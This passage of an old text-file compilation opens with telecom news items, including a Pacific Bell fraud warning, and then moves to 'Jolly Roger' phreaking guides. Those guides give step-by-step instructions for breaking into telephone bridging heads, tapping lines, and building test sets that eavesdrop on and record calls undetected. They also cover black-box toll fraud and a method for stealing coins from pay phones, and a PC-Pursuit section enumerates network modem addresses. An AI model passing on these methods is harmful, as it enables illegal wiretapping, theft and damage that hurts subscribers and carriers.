divestiture and the company now says it serves about 75 percent of the market.
     In addition to the reductions in basic long-distance rates, AT&T proposed
cutting prices by 5 percent and 5.7 percent for its Pro-America calling plans.
     The company also proposed to reduce prices by 2.9 percent for its 800
Service customers and 4.4 percent for WATS customers, although it would
increase the monthly access line charges for those plans by $3.20 to reflect
higher special access charges filed by the local phone companies.

==============================================================================
     ORLANDO, Fla. -- US Sprint Wednesday announced its long distance
operators who began saying, "May I help you?" just five months ago, are now
handling 3.5 million calls a month.
     The fiber-optic long-distance carrier, offering the only operator service
alternative to AT&T has experienced a 40 percent growth in operator service
calls since it announced its service July 1.
     Amanda Weathersby, US Sprint vice president of product marketing, said
Tuesday, "More and more people are taking advantage of our call completion
assistance and alternative billing arrangements.
     "Customer surcharges are the same as AT&T with the added benefit of US
Sprint's fiber-optic quality and lower long-distance rates."
     US Sprint currently offers person-to-person, station-to-station, call
completion and collect calling. US Sprint has announced an agreement with US
WEST Service Link that will allow anyone to call on US Sprint and charge
their calls to a Regional Bell Operating Co. calling card beginning in first
quarter 1988.
     "Previously, our operator service was available only on pre-subscribed
US Sprint phones and recently we added operator assistance for US Sprint FON
CARD customers," Weathersby said.
     "With this new agreement, we'll be able to expand our operator service
to markets such as pay phones, hospitals, and hotels/motels."
     The newest 24-hour operator service center in Dallas began operations on
Oct. 5.  US Sprint's other operator service centers are  in:  Cherry Hill,
N.J.; Atlanta; Lombard, Ill. and Reno, Nev.
     US Sprint is a joint venture of United Telecommunications Inc. of Kansas
City, Mo. and GTE Corp. of Stamford, Conn.

=             Pacific Bell Pursuing Calling Card Thief                       =
==============================================================================
     SAN FRANCISCO--(BW)--Pacific Bell is warning consumers to protect their
telephone calling cards like any other credit card in the wake of a series of
frauds by people posing as phone company employees.
     A Pacific Bell spokesman says customers in the 213, 805 and 916 area
codes are being victimized by someone who says he is a telephone company
employee investigating calling card fraud.  The individual calls people at
home at odd hours, asking for their calling card numbers.  He then sells the
numbers to people who use the numbers to make long distance phone calls.
     As recently as Monday of this week, 180 long distance calls were billed
to a Sacramento area resident who had given his number to the thief just three
hours earlier.
     According to Pacific Bell, this kind of scheme and other forms of calling
card fraud cost telephone customers nationwide half a billion dollars a year.
     The company offered these tips to consumers to avoid becoming a victim of
calling card fraud:
     Never give your calling card number or personal identification number to
anyone.  Any telephone company employee with a legitimate need to know the
number has access to it.    
     Treat your calling card like any other credit card.  Report its loss
immediately by calling the 800 number on the back of the card 800-621-0430.
     If you receive a suspicious call regarding your telephone calling card,
report it by calling the 800 number on the back of the card.    
     If you receive a call from someone claiming to be a telephone company
employee and asking for your calling card number, ask for a name and number to
call back.  Then call the local Pacific Bell business office to report the
incident.
     One suspect was arrested in Southern California last week by a quick
thinking customer who did just that.  Pacific Bell immediately contacted the
local police department.  A suspect holding seven stolen calling card numbers
was arrested minutes later.
     Pacific Bell and long-distance telephone companies will credit customers
for calling card charges determined to be fraudulent.  Pacific Bell is a
subsidiary of Pacific Telesis Group, a diversified telecommunications
corporation based in San Francisco.

The Phreaker's Guide to Loop Lines          courtesy of the Jolly Roger

    A loop is a wonderous device which the telephone company created as test
numbers for telephone repairmen when testing equipment.  By matching the
tone of the equipment with the tone of the loop, repairmen can adjust and test
the settings of their telephone equipment.
    A loop, basically, consists of two different telephone numbers.  Let's
use A and B as an example.  Normally if you call A, you will hear a loud
tone (this is a 1004 hz tone), and if you call B, the line will connect, and
will be followed by silence.
    This is the format of a loop line. Now, if somebody calls A and someone
else calls B--Viola!--A and B loop together, and one connection is made.
Ma Bell did this so repairmen can communicate with each other without
having to call their own repair office. They can also use them to exchange
programs, like for ANA or Ringback. Also, many CO's have a "Loop Assignment
Center".  If anyone has any information on these centers please tell me.
    Anyway, that is how a loop is constructed.  From this information,
anyone can find an actual loop line. Going back to the A and B example,
Note: the tone side and the silent side can be either A or B.  Don't be fooled
if the phone company decides to scramble them around to be cute.
   As you now know, loops come in pairs of numbers.  Usually, right after each
other.
 For example: 817-972-1890
                 and
              817-972-1891
   Or, to save space, one loop line can be written as 817-972-1890/1.
   This is not always true.  Sometimes, the pattern is in the tens or hundreds,
and, occaisionally, the numbers are random.
   In cities, usually the phone company has set aside a phone number suffix
that loops will be used for.  Many different prefixes will correspond
with that one suffix.
   In Arlington, Texas, a popular suffix for loops is 1893 and 1894, and
a lot of prefixes match with them to make the number.
 For Example:  817-460-1893/4
               817-461-1893/4
               817-465-1893/4
               817-467-1893/4
               817-469-1893/4
        ...are all loops...
   or a shorter way to write this is:
              817-xxx-1893/4
      xxx= 460, 461, 465, 467, 469
   Note: You can mix-and-match a popular suffix with other prefixs in a
city, and almost always find other loops or test numbers.
   Note: For Houston, the loop suffixes are 1499 and 1799.  And for Detroit
it's 9996 and 9997.
   When there are a large number of loops with the same prefix format,
chances are that many loops will be inter-locked.  Using the above example
of Arlington loops again, (I will write the prefixes to save space) 460, 461,
and 469 are interlocked loops.  This means that only one side can be used at
a given time.  This is because they are all on the same circuit. 
   To clarify, if 817-461-1893 is called, 817-460 and 469-1893 cannot be
called because that circuit is being used.  Essentialy, interlocked loops
are all the same line, but there are a variety of telephone numbers to access
the line.
   Also, if the operator is asked to break in on a busy loop line he/she
will say that the circuit is overloaded, or something along those
lines.  This is because Ma Bell has taken the checking equipment off
the line.  However, there are still many rarely used loops which can
be verfied and can  have emergency calls taken on them.
   As you have found out, loops come in many types.  Another type of loop is a
filtered loop.  These are loop lines that the tel co has put a filter on, so
that normal human voices cannot be heard on either line.  However, other
frequencies may be heard.  It all depends on what the tel co wants the
loop to be used for. If a loop has gotten to be very popular with the
local population or used frequently for conferences, etc. the tel co may filter
the loop to stop the unwanted "traffic".  Usually, the filter will be
removed after a few months, though.

How Ma Bell Works                               by the Jolly Roger
        
In  this  article,  I  will first describe  the  termination,  
wiring,  and  terminal  hardware most commonly used in  the  Bell  
system, and I will include section on methods of using them. 
     ------------- 
     LOCAL NETWORK 
     ------------- 
The   local   telephone   network   between   the    central  
office/exchange  and  the  telephone subscribers can  be  briefly  
described as follows: 
From  the  central office (or local exchange) of  a  certain  
prefix(es), underground area trunks go to each area that has that  
prefix  (Usually  more than one prefix per area.)  At  every  few  
streets or tract areas, the underground cables surface. They then  
go to the telephone pole (or back underground,  depending on  the  
area)  and  then  to the subsribers house (or in the case  of  an  
apartment building or mutliline business,  to a splitter or  dis- 
tribution box/panel).  
Now  that  we have the basics,  I'll try and go in-depth  on  the  
subject. 
    ------------------ 
    UNDERGROUND CABLES 
    ------------------ 
These  are sometimes inter-office trunks,  but usually in  a  
residential  area they are trunk lines that go to bridging  heads  
or  distribution  cases.  The cables are about 2-3  inches  thick  
(varies),  and  are  either  in  a metal  or  pvc-type  pipe  (or  
similiar).  Rarely (maybe not in some remote rural areas) are the  
cables  just 'alone' in the ground.   Instead they are usually in  
an  underground cement tunnel (resembles a small sewer or  storm- 
drain.)   The manholes are >heavy< and will say 'Bell system'  on  
them.  they can be opened with a 1/2 inch wide crowbar (Hookside)  
inserted  in the top rectangular hole.  There are ladder rungs to 
help you climb down.  You will see  the cable  pipes on the wall, 
with the blue and white striped one being  the inter-office trunk 
(at  least  in my  area).  The others  are local  lines,  and are 
usually marked or color  coded.  There is almost  always a posted 
color code  chart on the wall, not to mention  Telco manuals de- 
scribing the cables and terminals, so I need not get into detail. 
Also, there is usually  some kind  of  test equipment,  and often 
Bell test sets are  left  in there. 
       -------------- 
       BRIDGING HEADS 
       -------------- 
The  innocent-looking  grayish-green boxes.   These  can  be  
either trunk bridges or bridging for residences.  The major trunk  
bridging  heads  are usually larger,  and they have the  'Western  
Electric' logo at the bottom,  whereas the normal bridging  heads  
(which  may  be different in some areas-depending on the  company  
you are served by.  GTE B.H.'s look slightly different.  Also, do  
not  be  fooled by sprinkler boxes!)  They can be found  in  just  
about every city. 
To open a bridging head: if it is locked (and you're feeling  
destructive),  put a hammer or crowbar (the same one you used  on  
the  manhole) in the slot above the top hinge of the right  door.   
Pull hard, and the door will rip off. Very effective! If it isn't 
locked (as usual),  take a 7/8 inch hex socket and with it,  turn 
the bolt  about 1/8 of a turn  to the  right  (you  should hear a 
spring release inside). Holding the bolt, turn the handle all the 
way to the left and pull out. 
To Check for a test-set (which are often left by Bell employees), 
go inside - First check  for a test-set  (which  are  often  left  
by  Bell  employees).   There should be a panel of terminals  and  
wires.   Push the panel back about an inch or so,  and rotate the  
top  latch  (round with a flat section)  downward.   Release  the  
panel  and it will fall all the way forward.  There is usually  a  
large  amount  of wire and extra terminals.   The  test-sets  are  
often hidden here,  so don't overlook it (Manuals,  as  well,  are  
sometimes placed in the head).   On the right door is a metal box  
of alligator clips.   Take a few (Compliments of Bell.).  On each  
door is a useful little round metal device. (Says 'insert gently'  
or'  clamp  gently - do not overtighten' etc..)  On the front  of  
the disc, you should find two terminals.  These are for your test  
set.   (If you dont have one, dont despair -I'll show you ways to  
make basic test sets later in this article). 
Hook the ring (-) wire to the 'r' terminal;  and the tip (+)  
wire  to the other.  (By the way,  an easy way to  determine  the  
correct polarity is with a 1.5v LED.   Tap it to the term.  pair,  
if  it  doesnt light,  switch the poles until it does.   When  it  
lights,find the longer of the two LED poles:  This one will be on  
the  tip wire (+).   Behind the disc is a coiled  up  cord.  This  
should have two alligator clips on it..  Its very useful, because  
you dont have to keep connecting and disconnecting the fone (test  
set) itself, and the clips work nicely. 
On  the  terminal  board,  there should be  about  10  screw  
terminals  per  side.   Follow the wires,  and you can see  which  
cable pairs are active.  Hook the clips to the terminal pair, and  
you're set!   Dial out if you want,  or just listen (If someone's  
on theline).  Later,  I'll show you a way to set up a true  'tap'  
that  will let the person dial out on his line and receive  calls  
as normal, and you can listen in the whole time.  More about this  
later... 
On  major  prefix-area bridging heads,  you can  see  'local  
loops' ,which are two cable pairs (cable pair = ring+tip,  a fone  
line)  that are directly connected to each other on the  terminal  
board.   These  'cheap  loops' as they are called,  do  not  work  
nearLy  as  well  as the existing ones set up  in  the  switching  
hardware  at the exchange office.   (Try scanning your  prefixes'  
00xx  to 99xx #'s.)  The tone sides will announce themselves with  
the 1008 hz loop tone,  and the hang side will give no  response.   
The  first  person  should dial the 'hang' side,  and  the  other  
person dial the tone side,  and the tone should stop if you  have  
got the right loop.) 
If  you want to find the number of the line that you're  on,  
you  can either try to decipher the 'bridging log' (or whatever),  
which is on the left door.  If that doesnt work,  you can use the  
follwing: 
     --------------------------- 
     ANI # (Automatic Number ID) 
     --------------------------- 
This  is a Telco test number that reports to you the  number  
that youre calling from (It's the same, choppy 'Bell bitch' voice  
that you get when you reach a disconnected #)  
For the   213 NPA - Dial 1223 
          408 NPA - Dial 760 
          914 NPA - Dial 990 
These  are  extremely useful when messing with any  kind  of line
terminals, house boxes, etc. 
Now that we have bridging heads wired, we can go on... (don't  
forget to close and latch the box after all... Wouldnt want GE  
and Telco people mad, now, would we?)  
     ------------------------------------- 
     "CANS" - Telephone Distribution Boxes 
     ------------------------------------- 

Basically, two types: 
1> Large, rectangular silver box at the end of each street. 
2> Black, round, or rectangular thing at every telephone pole. 
Type 1 -   This is the case that takes the underground cable from  
the  bridge and runs it to the telephone pole cable (The  lowest,  
largest  one  on the telephone pole.)  The box is always  on  the  
pole nearest the briging head, where the line comes up.  Look for  
the 'Call before you Dig - Underground cable' stickers.. 
The  case box is hinged,  so if you want to climb the  pole,  
you  can open it with no problems.   These usually have 2 rows of  
terminal sets.  
You  could try to impersonate a Telco technician and  report  
the  number as 'new active' (giving a fake name and fake  report,  
etc.)   I  dont recommend this,  and it  probably  won't  (almost  
positively won't) work,  but this is basically what Telco linemen  
do). 
Type  2 - This is the splitter box for the group of houses around  
the  pole  (Usually  4 or 5 houses).   Use it  like  I  mentioned  
before.   The terminals (8 or so) will be in 2 horizontal rows of  
sets.   The  extra  wires  that  are  just  'hanging  there'  are  
provisions for extra lines to residences (1 extra line per house,  
thats  why  the insane charge for line #3!)  If its the  box  for  
your  house  also,  have fun and swap lines with  your  neighbor! 
'Piggyback'  them  and  wreak havoc  on  the  neighborhood  (It's  
eavesdropping  time...)  Again,  I don't recommend this,  and its  
difficult to do it correctly.  Moving right along... 
     ------------------------------ 
     APARTMENT / BUSINESS MULTILINE 
           DISTRIBUTION BOXES 
     ------------------------------ 
Found  outside the buliding (most often on the  right  side,  
but not always...   Just follow the wire from the telephone pole)  
or  in the basement.   It has a terminal for all the lines in the  
building.   Use it just like any other termination box as before.  
Usually says 'Bell system' or similar.  Has up to 20 terminals on  
it (usually.) the middle ones are grounds (forget   these).   The  
wires come from the cable to one row (usually the left one), with 
the other row of terminals for the other row of terminals for the  
building  fone wire pairs.   The ring (-) wire is usually the top  
terminal if the set in the row (1 of 10 or more),  and the tip is  
in the clamp/screw below it.  This can be reversed, but the cable  
pair is always terminated one-on-top-of-each- other,  not on  the  
one  next  to  it.  (I'm  not sure why the other  one  is  there,  
probably as aprovision for extra lines) Don't use it  though,  it  
is usually to close to the other terminals, and in my experiences  
you get a noisy connection. 
Final note:  Almost every apartment, business, hotel, or anywhere  
there   is  more  than  2  lines  this  termination  lines   this  
termination method is used.  If you can master this type, you can  
be  in control of many things...   Look around in your area for a  
building  that  uses this type,  and practice hooking up  to  the  
line, etc. 
As  an  added  help,here is the basic  'standard'  color-code  for  
multiline terminals/wiring/etc... 
Single line:  Red = Ring 
            Green = Tip 
           Yellow = Ground * 
*  (Connected  to  the ringer coil  in  individual  and  bridged  
    ringer   phones (Bell only)  Usually  connected to the  green  
    (Tip) 
Ring (-) = Red 
           White/Red Stripe 
           Brown 
           White/Orange Stripe 
           Black/Yellow Stripe 
Tip (+) =  Green (Sometimes 
            yellow, see above.) 
           White/Green Stripe 
           White/Blue Stripe 
           Blue 
           Black/White Stripe 
Ground =   Black 
           Yellow 
      ---------------------- 
      RESIDENCE TERMINAL BOX 
      ---------------------- 
Small,  gray (can be either a rubber (Pacific Telephone) or  hard 
plastic  (AT & T) housing deal that connects the cable pair  from  
the  splitter box (See type 2,  above) on the pole to your  house  
wiring.  Only 2 (or 4, the 2 top terminals are hooked in parallel  
with the same line) terminals, and is very easy to use.  This can  
be  used to add more lines to your house or add an external  line  
outside the house. 
      --------- 
      TEST SETS 
      --------- 
Well,  now  you  can  consider  yourself a minor  expert  on  the  
terminals and wiring of the local telephone network.  Now you can  
apply  it  to whatever you want to do..  Here's another  helpful  
item: 
How  to  make  a Basic Test-Set and how to use it  to  dial  out,  
eavsdrop, or seriously tap and record line activity. 
These are  the  (usually) orange hand set fones  used  by  Telco  
technicians to test lines.   To make a very simple one,  take any  
Bell (or other,  but I recommend a good Bell fone like a princess  
or a trimline. gte flip fones work excllently, though..) fone and  
follow the instructions below. 
Note:    A 'black box' type fone mod will let you tap into  their  
line,  and with the box o,  it's as if you werent there. they can  
recieve  calls and dial out,  and you can be listening the  whole  
time! very useful.  With the box off, you have a normal fone test  
set. 
Instructions: 
A  basic black box works well with good results.   Take the cover  
off  the fone to expose the network box (Bell type  fones  only).   
The <RR> terminal should have a green wire going to it (orange or  
different  if  touch tone - doesnt matter,  its the same  thing).  
Disconnect the wire and connect it to one pole of an SPST switch.   
Connect  a  piece  of wire to the other pole of  the  switch  and  
connect it to the <RR> terminal.   Now take a 10k hm 1/2 watt 10%  
resistor  and  put  it  between the <RR>  terminal  ad  the  <F>  
terminal,  which  should have a blue and a white wire going to it  
(different for touch tone).  It should look like this: 
-----Blue wire----------<F> 
                   ! 
----White wire-----! 
                   ! 
              10k Resistor 
                   ! 
                   ! 
--Green wire--     !----<RR> 
              !    ! 
               SPST 
What  this  does in effect is keep the hookswitch  /  dial  pulse  
switch (F to RR loop) open while holding the line high with  the  
resistor.   This gives the same voltage effect as if the fone was  
'on-hook',  while  the 10k ohms holds the voltage right above the  
'off hook' threshold (around 22 volts or so, as compared to 15-17   
or normal off hook 48 volts for normal 'on-hook'), giving 
Test Set Version 2.
Another  design is similar to the 'type 1' test set (above),  
but has some added features:
From >----------------Tip------<To Test 
Alligator                        set 
Clip >----------------Ring-----<phone 
            !                ! 
            x                ! 
            !                ! 
            o                ! 
            !    x---RRRRR---! 
            !   x            ! 
            !---x            ! 
                 x----0------! 
x    = Spst Switch 
o    = Red LOD        0   = Green LED 
RRRRR= 1.8k 1/2 watt  xxxx= Dpst switch 
        resistor 
When the SPST switch in on, the LED will light, and the fone  
will become active.   The green light should be on.  If it isn't,  
switch  the dpst.   If it still isnt,  check the polarity of  the  
line and the LEDs.   With both lights on, hang up the fone.  They  
should all be off now.   Now flip the dpst and pick up the  fone.   
The  red  LED shold be on,  but the green shouldnt.   If  it  is,  
something is wrong with the circuit.  You wont get a dial tone if  
all is correct. 
When  you  hook  up  to the line with  the  alligator  clips  
(Assuming you have put this circuit inside our fona and have  put  
alligator clips on the ring and tip wires (As we did before)) you  
should  have the spst #1 in the off posistion.  This will greatly  
reduce the static noise involved in hooking up to a line. The red  
LED can also be used to check if you have the correct polarity. 
With  this  fone you will have the ability to listen  in  on  
>all< audible line activity,  and the people (the 'eavesdropees')  
can use their fone as normal. 
Note that test sets #1 and #2 have true 'black boxes', and can be  
used for free calls (see an article about black boxes). 

Test Set Version 3 

To do test set 3: 
Using a trimline (or similar) phone, remove the base and cut  
all  of  the wire leads off except for the red (ring -)  and  the  
green  (tip +).   Solder alligator clips to the  lug.   The  wire  
itself  is  'tinsel' wrapped in rayon,  and doesnt solder  well.   
Inside  the one handset,  remove the light socket (if it has one)  
and install a small slide or  toggle switch (Radio Shack's micro-  
miniature  spst works well).   Locate the connection of the  ring  
and the tip wires on the pc board near where the jack is  located  
at the bottom of the handset.  (The wires are sometimes black or  
brow instead of red and green,  respectively).   Cut the foil and  
run 2 pieces of wire to your switch.  In parallel with the switch  
add  a .25 uf 200 VDC capacitor (mylar,  silvered mica,  ceramic,  
not  an electrolytic).  When the switch is  closed,  the  handset  
functions normally.   With the switch in the other position,  you  
can listen without being heard. 
Note:  To  reduce the noise involved in connecting the clips to a  
line,  add  a  switch selectable 1000 ohm 1/2  watt  resistor  in  
series with the tip wire. Flip it in circuit when connecting, and  
once on the line, flip it off again. (or just use the 'line disc-  
onect'  type  switch as in the type 2 test  set  (above)).   Also  
avoid   touching the alligator clips to any metal parts or  other  
terminals,  for  i causes static on the line and raises  poeple's  
suspicions.  
      --------- 
      RECORDING 
      --------- 
If you would like to record any activity,  use test set 1 or  
2  above  (for unattended recording of >all< line  activity),  or  
just  any test set if you are going to be there to  monitor  when  
they are dialing, talking, etc.  
Place  a  telephone pickup coil (I recommend the Becoton  T-5  TP  
coil  or equivalent) onto the test set,  and put the TP plug into  
the mic.  jack of any standard tape recorder.  Hit play, rec, and  
pause.   Alternate  pause when you want to record (I  dont  think  
anyone should have any difficulty with this at all...) 
Well,  if  you  still can't make a test set or you dont have  the  
parts, there's still hope.  Alternate methods:          
1>  Find  a  bell test set in a manhole or a  bridging  head  and  
'Borrow it indefinately... 
2>  Test sets can  be  purchased from: 
    Techni-Tool 
    5 Apollo Road 
    Box 368 
    Plymouth Meeting PA., 19462 
Ask for catalog #28 
They  are usually $300 - $600, and are supposed to have  MF  
dialing  capability as well as TT dialing.  They are also of much  
higher quality than the standard bell test sets. 
If you would like to learn more about the subjects covered here,  
I suggest: 
1>  Follow Bell trucks and linemen or technicians and ask  subtle  
    questions. also try 611 (repair service) and ask questions.. 
2> Explore your area for any Bell hardware,  and experiment  with  
   it.  Don't try something if you are not sure what youre doing,  
   because you wouldnt want to cause problems, would you?

Getting Money out of Pay Phones                by the Jolly Roger

I will now share with you my experiences with pay telephones.  You will discover
that it is possible to get money from a pay phone with a minimum of effort.
Theory: Most pay phones use four wires for the transmission of data and 
codes to the central office.  Two of them are used for voice (usually red and
green), one is a ground, and the last is used with the others for the
transmission of codes.
It is with this last wire that you will be working with.  On the pay phone that
I usually did this to, it was colored purple, but most likely will be another
color.
What you will do is simply find a pay phone which has exposed wires, such that
one of them can be disconnected and connected at ease without
fear of discovery. You will discover that it is usually a good idea to
have some electrical tape along with you and some tool for cutting this
tape. 
Through trial and error, you will disconnect one wire at a time starting with
the wires different than green and red.  You do want a dial tone during
this operation.
What you want to disconnect is the wire supplying the codes to the telephone
company so that the pay phone will not get the 'busy' or 'hang-up' command.
Leave this wire disconnected when you discover it.
What will happen:  Anytime that someone puts any amount of money into the pay
phone, the deposit will not register with the phone company and it
will be held in the 'temporary' chamber of the pay phone.
Then, (a day later or so) you just code back to the phone, reconnect the wire,
and click the hook a few times and the phone will dump it all out the shute.
(What is happening is that the 'hangup' code that the phone was not
receiving due to the wire being disconnected suddenly gets the code and
dumps its' 'temporary' storage spot.)
You can make a nice amount of money this way, but remember
that a repairman will stop by every few times it is reported broken and
repair it, so check it at least once a day.
Enjoy and have fun.. Many phones I have done this to, and it works
well with each..

Computer Based PBX                     Courtesy of the Jolly Roger
    (Originally an Apple ][ file for forgive the upper case!)

TO GET A BETTER UNDERSTANDING OF WHAT A PBX CAN DO, HERE ARE A FEW BASIC
FUNDAMENTALS.THE MODERN PBX IS A COMBINED COMPUTER,MASS STORAGE DEVICE,
AND OF COURSE A SWITCHING SYSTEM THAT CAN:
      [1] PRODUCE ITEMIZED,AUTOMATED BILLING PROCEDURES,TO ALLOW THE
          IDENTIFICATION AND MANAGEMENT OF TOLL CALLS. [HAHAHA]
      [2] COMBINE DAYTIME VOICE GRADE COMMUNICATION CIRCUITS INTO
          WIDEBAND DATA CHANNELS FOR NIGHT TIME HIGH SPEED DATA
          TRANSFERS.
      [3] HANDLES ELECTRONIC MAIL [ INCLUDING OFFICE MEMOS ].
      [4] COMBINE VOICE CHANNELS INTO A WIDEBAND AUDIO/VISUAL
          CONFERENCE CIRCUIT,WITH THE ABILITY TO XFER AND
          CAPTURE SLIDES,FLIPCHARTS,PICTURES OF ANY KIND.
BOTH THE EXTERNAL AND INTERNAL CALLING CAPACITY OF THE PBX SYSTEM MUST BE
CAREFULLY CONSIDERED BECAUSE MANY BUSINESS OPERATIONS RUN A VERY HIGH RATIO
OF INTERNAL STATION TO STATION DIALING AND A LOW CAPACITY SYSTEM WILL NOT
HANDLE THE REQUESTED TRAFFIC LOAD.
A CRITICAL FACTOR IS THE NUMBER OF TRUNKS AND THE CENTRAL OFFICE FACILITIES
THAT ARE USED FOR OUTSIDE CONNECTIONS.ANOTHER IS THE NUMBER OF JUNCTIONS OR
[LINKS] THAT MAKE UP THE INTERNAL CALLING PATHS.
TO UNDERSTAND THE SERVICES AVAILABLE ON A TYPICAL COMPUTER RUN PBX IT IS
NECESSARY TO INTRODUCE THE SUBJECT OF TIME DIVISION SWITCHING.IN A TIME
DIVISION SWITCHING NETWORK ALL CONNECTIONS ARE MADE VIA A SINGLE COMMON BUS
CALLED (OF COURSE) A 'TIME-DIVISION BUS'.EVERY LINE TRUNK THAT REQUIRES A
CONNECTION WITH ANOTHER IS PROVIDED WITH A PORT CIRCUIT.ALL PORT CIRCUITS
HAVE ACCESS TO THE TIME DIVISION BUS THROUGH A TIME DIVISION SWITCH.
[WHEN TWO PORTS REQUKRE CONNECTION,THEIR TIME DIVISION SWITCHES OPERATE AT
A VERY HIGH FREQUENCY (16,000 TIMES PER SECOND).THIS TECHNIQUE,WHICH IS
CALLED 'SPEECH SAMPLING',ALLOWS MANY SIMULTANEOUS CONNECTIONS OVER THE SAME
TIME DIVKSION BUS.EACH CONNECTION IS ASSIGNED A TIME INTERVAL,THE 'TIME SLOT'
,AND THE NUMBER OF TIME SLOTS IDENTIFIES THE NUMBER OF SIMULTANEOUS CONNECT-
IONS AMONG PORTS.]
THE NEXT CRITICAL ITEM IS CIRCUIT PACKS.THE SYSTEM ELEMENTS THAT WE WILL BE
DESCRIBING IN FUTURE TUTORIALS [LINES/TRUNKS/SWITCHES,MEMORY AND CONTROL] ARE
CONTAINED ON PLUG IN CIRCUIT PACKS.EACH LINE CIRCUIT PACK CONTAINS A NUMBER
OF LINES,IN EXAMPLE,FOUR.BUT THE ASSIGNMENT OF STATION NUMBERS TO ACTUAL
PHONE LINE CIRCUITS IS FLEXIBLE.
THE SYSTEM MEMORY IS CONTAINED IN CIRCUIT PACKS WHICH PROVIDE THE CALL
PROCESSING FUNCTIONS.THE CIRCUIT PACKS ARE HELD IN SMALL FRAMES CALLED
'CARRIERS'.WITHIN EACH CARRIER,THE CIRCUIT PACKS ARE PLUGGED INTO POSITIONS:
THE 'SLOTS'.EVERY CIRCUIT CAN BE ADDRESSED BY,SAY A FIVE DIGIT NUMBER WHICH
TELLS ITS LOCATION BY CARRIER-SLOT-CIRCUIT.... [STARTING TO GET THE IDEA?]
THERE CAN BE THREE TYPES OF CARRIERS IN A MODERN PBX SYSTEM:
                O LINE CARRIERS
                O TRUNK CARRIERS
                O CONTROL CARRIERS
THE LINE CARRIERS CONTAIN STATION LINES.IN A.T.& T.'S "DIMENSION" MODEL,FOR
EXAMPLE,A TOTAL OF 52 TO 64 LINES ARE PROVIDED.THE TRUNK CARRIERS CONTAIN
SLOTS FOR 16 TRUNK CIRCUIT PACKS.THE CONTROL CARRIER INCLUDES PROCESSOR,
MEMORY,CONTROL CIRCUITRY,DATA CHANNELS FOR ATTENDANT CONSOLE CONTROL AND
TRAFFIC MEASUREMENT OUTPUTS.
PBX SYSTEMS WILL DIRECTLY REFLECT THE TYPES OF SERVICES OFFERED AT THE C.O.
           O CCSA
           O CCIS
           O PICTUREPHONES [SOONER THAN YOU THINK MY PHRIENDS]
COMMON CONTROL SWITCHING ARRANGEMENTS ( CCSA ) PERMIT ANY UNRESTRICTED TELE-
PHONE STATION TO CALL ANY OTHET INTERNAL OR EXTERNAL SYSTEM STATION BY USING
THE STANDARD SEVEN DIGIT NUMBER.ALTERNATE ROUTING IS A FEATURE OF CCSA SERVICE
THE INTERFACILITY,ALTERNATE ROUTED CALLING PATHS ARE ACCOMPLISHED AT THE TELE-
PHONE COMPANY CENTRAL OFFICE LEVEL,NOT AT THE PBX LEVEL.
A SYSTEM OF INTEREST TO LARGE SCALE TELEPHONE USERS IS COMMON CHANNEL INTER-
OFFICE SIGNALLING (CCIS).TYPICALLY,THIS TECHNIQUE EMPLOYS COMMON CHANNELS TO
CARRY ALL INTERFACILITY SIGNALLING INSTRUCTIONS: DIAL PULSES,ON HOOK (IDLE),
OFF HOOK (BUSY),AND SO ON,BETWEEN TWO SWITCHING CENTERS. [ GETTING WARM ].
CCIS REPLACES OLDER METHODS OF INTEROFFICE SIGNALLING SUCH AS 'IN BAND' AND
'OUT OF BAND' TECHNIQUES. BY THE WAY,REAL PHREAKS ARE SELLING THEIR BOXES TO
IDIOTS WHO STILL THINK THE'RE WORTH ALOT...THE FORMER (IN BAND) TRANSMITS
SIGNALLING DATA WITHIN THE NORMAL CONVERSATION BANDWIDTH.IT'S SHORTCOMING IS
THAT FALSE INFORMATION MAY BE TRANSMITTED DUE TO UNIQUE TONE OR NOISE
COMBINATIONS SET UP IN THE TALKING PATH. [THIS IS THE OFFICIAL REASONING].
OUT OF BAND SIGNALLING TECHNIQUES PLACED THE INTEROFFICE DATA IN SPECIAL
CHANNELS,GENERALLY ADJACENT TO AND IMMEDIATELY ABOVE THE VOICE PATH.TO PRE-
SERVE INTERCHANNEL INTEGRITY,OUT OF BAND SIGNALLING REQUIRES VERY EFFECIENT
FILTERING OR GREATER 'BAND GUARD' SEPERATION BETWEEN CHANNELS.

         Subject:    PC-Pursuit Port Statistic's 
         Date:       06/29/89 
         Written by: PC-Pursuit Users 
         ============================================================ 
         Introduction: 
         ============= 
              The last 30 days of PC-Pursuit have been extremely 
         controversial.  Users and ex-users have demanded accurate 
         statistics, and Telenet has provided us with very little. 
         And the data that was provided is questionable.  Well, here 
         is some data that is guaranteed to be accurate and make 
         Telenet scream. If you wish to update this data on your own, 
         we will tell you how later in this text. 
              The following chart consists of all the direct Telenet 
         addresses of the PC-Pursuit city nodes and the total number 
         of modems on each node.  Here is what the data means: 
         NJNEW/3 2011    .12    56 
         !     ! !        !      \-- Total Number of Modems in NJNEW 
         !     ! !        \- Last Working Suffix of Address sequence. 
         !     ! \- Direct Telenet Address Prefix. 
         !     \--- Baud Rate of This Port is 300. 
         \--------- Mnemonic. 
         Please note that there are several perfectly legal ways to 
         connect to a PC-Pursuit port such as NJNEW/3: 
              Ways To Connect to NJNEW/3: 
                   1)   C D/NJNEW/3,PCP10000,<password>   [HUNT] 
                   2)   C 2011,PCP10000,<password>        [HUNT] 
                   3)   C 2011.10,PCP10000,<password>     [NON HUNT] 
         The first, is self explanatory.  The second does the same 
         thing as the first, only that it is slightly faster and gives 
         the user much greater flexibility.  The third is an example 
         the flexibility, because a request is made to connect to the 
         tenth, and only the tenth, modem on the NJNEW/3 port. 
              By simply attempting to connect to every single modem 
         in the 2011 chain, we were able to count the number of modems 
         on each port and come up with the following charts which were
         extracted on June the twenty ninth of the year 1989: 
         Rotary   Direct  Max.  City     Rotary   Direct  Max.  City 
         Port     Address Range Total    Port     Address Range Total

              NOTE: CASAC/3, CASAC/24 were estimated. 
         I think the statistics basically speak for themselves. 
         I am sure there will no doubt be hundreds of people who will 
         not smile at the number of specific kinds of ports supported, 
         not to mention the number of 'dead' or 'down' modems you will 
         find when you verify the totals.  Usually, 2% to perhaps 10% 
         of the modems are 'dead' with specific ones repeatedly 
         failing week after week. 
         History Of This Collection: 
         =========================== 
              Almost a year ago a small selected group of devoted 
         individuals got together to discuss problems with the PC- 
         Pursuit Network, in the middle of our discussions a question 
         was asked as to how the network really processes our calls. 
         This was intended to help us assess SET? commands and other 
         such matters.  When the address hypothesis was offered we 
         quickly set out to prove it.  It was proved in about 3 
         minutes with the discovery of 2011 (First try was xxx1).  The 
         data has continually been collected and analyzed ever since, 
         but until now, has never been mass released. 
              A small group of teen age hackers discovered several 
         interesting things that can be done with these addresses-- 
         many of which will not be discussed here short of mentioning 
